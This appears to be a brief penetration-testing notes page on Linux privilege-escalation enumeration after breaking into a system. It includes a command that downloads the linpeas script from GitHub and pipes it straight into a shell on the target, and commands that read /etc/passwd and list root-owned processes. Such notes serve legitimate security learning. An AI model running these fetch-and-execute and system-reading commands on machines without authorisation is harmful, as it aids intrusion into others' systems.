# Information Gathering - Linux Privilage Escalation

When we infiltrate a system, we should know how to escalate our privilages effectively. That means that we need to peform excellent enumeration on the target.

## Linpeas

Linpeas is a powerful enumeration script that looks for different ways to escalate privilages on Linux based systems. 

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 	# runs linpeas on a target using curl
```

We'll have more documentation about Linpeas and it's usage in the future as it is definately is a relevent and powerful tool.

## OS Information

```
cat /proc/version	# kernel version
cat /etc/passwd		# lists system accounts
cat /etc/issue		# get distro
```

## Services

```
ps aux			# check which services are running
cat /etc/services	# list services
ps aux | grep root	# check which services are being run by root
```

## Installed Applications

```
ls -alh /usr/bin	# check installation, version, and status of applications
```
